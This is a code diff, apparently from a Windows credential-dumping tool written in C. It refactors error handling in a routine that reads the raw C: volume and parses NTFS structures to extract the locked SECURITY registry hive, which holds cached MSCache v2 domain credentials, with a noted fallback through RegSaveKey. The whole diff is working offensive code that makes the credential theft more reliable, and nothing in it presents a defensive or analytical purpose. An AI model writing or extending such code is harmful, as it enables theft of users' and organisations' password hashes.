@@ -55,19 +55,23 @@ static BOOL ReadHiveFile(PWSTR path, HIVE_DATA* h) {
 
 // ─── Source 1: MSCache v2 from SECURITY hive ───
 static DWORD ExtractMSCache(PBYTE* outBlob, PSIZE_T outSz) {
+    HIVE_DATA sec = {0};
+
     HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
         FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
-    if (hVol == INVALID_HANDLE_VALUE) return 0;
-
-    NTFS_CONTEXT ctx;
-    ParseNtfsBoot(hVol, &ctx);
-    PBYTE mft = NULL; SIZE_T mftSz = 0;
-    ReadMft(hVol, &ctx, &mft, &mftSz);
-    HIVE_DATA sec = {0};
-    ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
-        L"\\Windows\\System32\\config\\SECURITY", &sec);
-    CloseHandle(hVol); VirtualFree(mft, 0, MEM_RELEASE);
+    if (hVol != INVALID_HANDLE_VALUE) {
+        NTFS_CONTEXT ctx = {0};
+        if (ParseNtfsBoot(hVol, &ctx)) {
+            PBYTE mft = NULL; SIZE_T mftSz = 0;
+            if (ReadMft(hVol, &ctx, &mft, &mftSz)) {
+                ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
+                    L"\\Windows\\System32\\config\\SECURITY", &sec);
+                VirtualFree(mft, 0, MEM_RELEASE);
+            }
+        }
+        CloseHandle(hVol);
+    }
 
     if (!sec.data) {
         // Raw NTFS failed (ReFS etc.) — fallback: save SECURITY hive via RegSaveKey
